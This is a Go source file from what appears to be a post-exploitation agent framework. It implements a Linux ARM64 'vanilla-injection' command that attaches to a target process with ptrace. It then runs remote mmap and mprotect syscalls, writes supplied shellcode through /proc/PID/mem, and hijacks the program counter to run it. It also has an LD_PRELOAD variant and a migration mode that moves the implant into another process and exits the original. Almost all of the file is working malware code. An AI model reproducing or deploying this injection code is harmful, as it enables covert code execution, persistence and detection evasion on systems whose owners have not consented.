//go:build linux && arm64

package commands

import (
	"encoding/base64"
	"fmt"
	"log"
	"os"
	"runtime"
	"strings"
	"syscall"
	"time"

	"fawkes/pkg/structs"
)

const (
	arm64SysMmap     = 222
	arm64SysMprotect = 226
	arm64SysMunmap   = 215
)

type VanillaInjectionCommand struct{}

func (c *VanillaInjectionCommand) Name() string { return "vanilla-injection" }
func (c *VanillaInjectionCommand) Description() string {
	return "Remote process injection via /proc/PID/mem direct write (T1055.009)"
}

func (c *VanillaInjectionCommand) Execute(task structs.Task) structs.CommandResult {
	params, parseErr := unmarshalParams[VanillaInjectionParams](task)
	if parseErr != nil {
		return *parseErr
	}

	if params.ShellcodeB64 == "" {
		return errorResult("Error: No shellcode data provided")
	}

	shellcode, err := base64.StdEncoding.DecodeString(params.ShellcodeB64)
	if err != nil {
		return errorf("Error decoding shellcode: %v", err)
	}

	if len(shellcode) == 0 {
		return errorResult("Error: Shellcode data is empty")
	}

	if strings.EqualFold(params.Action, "ldpreload") {
		info, err := ldpreloadInject(shellcode, params.Target)
		if err != nil {
			return errorf("[!] LD_PRELOAD injection failed: %v", err)
		}
		return successResult(fmt.Sprintf("[+] LD_PRELOAD injection: %s\n[*] Shellcode runs as DT_INIT in spawned process\n", info))
	}

	if params.PID <= 0 {
		return errorResult("Error: Invalid PID specified")
	}

	if isMigrateAction(params.Action) {
		result := procMemInjectArm64(params.PID, shellcode)
		if result.Status == "success" {
			result.Output += "[*] Migration mode: injected payload into target process\n"
			result.Output += "[*] Scheduling agent exit in 5 seconds to allow response delivery...\n"
			go func() {
				time.Sleep(5 * time.Second)
				log.Printf("process migration complete — exiting original agent")
				os.Exit(0)
			}()
		}
		return result
	}

	return procMemInjectArm64(params.PID, shellcode)
}

func procMemInjectArm64(pid int, shellcode []byte) structs.CommandResult {
	var sb strings.Builder
	sb.WriteString(fmt.Sprintf("[*] Shellcode: %d bytes\n", len(shellcode)))
	sb.WriteString(fmt.Sprintf("[*] Target PID: %d\n", pid))
	sb.WriteString("[*] Technique: /proc/PID/mem direct write (ARM64)\n")

	if _, err := os.Stat(fmt.Sprintf("/proc/%d", pid)); err != nil {
		return errorResult(sb.String() + fmt.Sprintf("[!] Process %d not found\n", pid))
	}

	// Check Yama scope before attempting ptrace
	scope, hint := checkYamaScope()
	if scope >= 1 && os.Geteuid() != 0 {
		sb.WriteString(fmt.Sprintf("[!] %s\n", hint))
	}

	runtime.LockOSThread()
	defer runtime.UnlockOSThread()

	sb.WriteString(fmt.Sprintf("[*] PTRACE_ATTACH to PID %d...\n", pid))
	if err := syscall.PtraceAttach(pid); err != nil {
		if err == syscall.EPERM && scope >= 1 {
			return errorResult(sb.String() + fmt.Sprintf("[!] PTRACE_ATTACH failed: %v\n[!] %s\n", err, hint))
		}
		return errorResult(sb.String() + fmt.Sprintf("[!] PTRACE_ATTACH failed: %v\n", err))
	}

	var ws syscall.WaitStatus
	if _, err := syscall.Wait4(pid, &ws, 0, nil); err != nil {
		_ = syscall.PtraceDetach(pid)
		return errorResult(sb.String() + fmt.Sprintf("[!] Wait4 failed: %v\n", err))
	}
	sb.WriteString("[+] Process stopped\n")

	var origRegs syscall.PtraceRegs
	if err := syscall.PtraceGetRegs(pid, &origRegs); err != nil {
		_ = syscall.PtraceDetach(pid)
		return errorResult(sb.String() + fmt.Sprintf("[!] PTRACE_GETREGS failed: %v\n", err))
	}
	sb.WriteString(fmt.Sprintf("[+] Saved registers (PC=0x%X, SP=0x%X)\n", origRegs.Pc, origRegs.Sp))

	svcAddr, err := findSyscallGadget(pid)
	if err != nil {
		_ = syscall.PtraceDetach(pid)
		return errorResult(sb.String() + fmt.Sprintf("[!] %v\n", err))
	}
	sb.WriteString(fmt.Sprintf("[+] Found SVC gadget at 0x%X\n", svcAddr))

	pageSize := uint64(4096)
	scSize := uint64(len(shellcode))
	if scSize > pageSize {
		pageSize = ((scSize + 4095) / 4096) * 4096
	}

	// Execute mmap(222) in target: allocate RW page
	allocAddr, err := execRemoteSyscallArm64(pid, &origRegs, svcAddr,
		arm64SysMmap, 0, pageSize, 3, 0x22, ^uint64(0), 0)
	if err != nil {
		_ = syscall.PtraceSetRegs(pid, &origRegs)
		_ = syscall.PtraceDetach(pid)
		return errorResult(sb.String() + fmt.Sprintf("[!] mmap syscall failed: %v\n", err))
	}
	if allocAddr >= 0xfffffffffffff000 {
		_ = syscall.PtraceSetRegs(pid, &origRegs)
		_ = syscall.PtraceDetach(pid)
		return errorResult(sb.String() + fmt.Sprintf("[!] mmap returned MAP_FAILED (0x%X)\n", allocAddr))
	}
	sb.WriteString(fmt.Sprintf("[+] mmap allocated RW page at 0x%X (%d bytes)\n", allocAddr, pageSize))

	// Write shellcode via /proc/PID/mem
	memPath := fmt.Sprintf("/proc/%d/mem", pid)
	n, err := writeProcMem(memPath, allocAddr, shellcode)
	if err != nil {
		_ = syscall.PtraceSetRegs(pid, &origRegs)
		_ = syscall.PtraceDetach(pid)
		return errorResult(sb.String() + fmt.Sprintf("[!] %v\n", err))
	}
	sb.WriteString(fmt.Sprintf("[+] Wrote %d bytes via /proc/%d/mem at 0x%X\n", n, pid, allocAddr))

	// Execute mprotect(226) in target: RW → RX
	mprotectRet, err := execRemoteSyscallArm64(pid, &origRegs, svcAddr,
		arm64SysMprotect, allocAddr, pageSize, 5, 0, 0, 0)
	if err != nil {
		_ = syscall.PtraceSetRegs(pid, &origRegs)
		_ = syscall.PtraceDetach(pid)
		return errorResult(sb.String() + fmt.Sprintf("[!] mprotect syscall failed: %v\n", err))
	}
	if mprotectRet != 0 {
		sb.WriteString(fmt.Sprintf("[!] mprotect returned %d (non-zero), continuing anyway\n", int64(mprotectRet)))
	} else {
		sb.WriteString("[+] mprotect: page now PROT_READ|PROT_EXEC\n")
	}

	// Redirect execution to shellcode
	newRegs := origRegs
	newRegs.Pc = allocAddr
	if err := syscall.PtraceSetRegs(pid, &newRegs); err != nil {
		_ = syscall.PtraceSetRegs(pid, &origRegs)
		_ = syscall.PtraceDetach(pid)
		return errorResult(sb.String() + fmt.Sprintf("[!] PTRACE_SETREGS failed: %v\n", err))
	}
	sb.WriteString(fmt.Sprintf("[+] Set PC to 0x%X\n", allocAddr))

	sb.WriteString("[*] Continuing execution...\n")
	if err := syscall.PtraceCont(pid, 0); err != nil {
		_ = syscall.PtraceSetRegs(pid, &origRegs)
		_ = syscall.PtraceDetach(pid)
		return errorResult(sb.String() + fmt.Sprintf("[!] PTRACE_CONT failed: %v\n", err))
	}

	if err := syscall.PtraceDetach(pid); err != nil {
		sb.WriteString(fmt.Sprintf("[!] PTRACE_DETACH failed: %v\n", err))
	} else {
		sb.WriteString("[+] Detached from process\n")
	}

	sb.WriteString("[+] /proc/mem injection completed successfully\n")
	return successResult(sb.String())
}

// execRemoteSyscallArm64 executes a syscall in the target process via ptrace (ARM64).
// ARM64 ABI: X8=sysno, X0-X5=args, return in X0.
func execRemoteSyscallArm64(pid int, origRegs *syscall.PtraceRegs, svcAddr uint64,
	sysno, arg1, arg2, arg3, arg4, arg5, arg6 uint64) (uint64, error) {

	regs := *origRegs
	regs.Pc = svcAddr
	regs.Regs[8] = sysno
	regs.Regs[0] = arg1
	regs.Regs[1] = arg2
	regs.Regs[2] = arg3
	regs.Regs[3] = arg4
	regs.Regs[4] = arg5
	regs.Regs[5] = arg6

	if err := syscall.PtraceSetRegs(pid, &regs); err != nil {
		return 0, fmt.Errorf("set regs: %w", err)
	}
	if err := syscall.PtraceSingleStep(pid); err != nil {
		return 0, fmt.Errorf("single step: %w", err)
	}

	var ws syscall.WaitStatus
	if _, err := syscall.Wait4(pid, &ws, 0, nil); err != nil {
		return 0, fmt.Errorf("wait4: %w", err)
	}
	if err := syscall.PtraceGetRegs(pid, &regs); err != nil {
		return 0, fmt.Errorf("get regs: %w", err)
	}

	return regs.Regs[0], nil
}
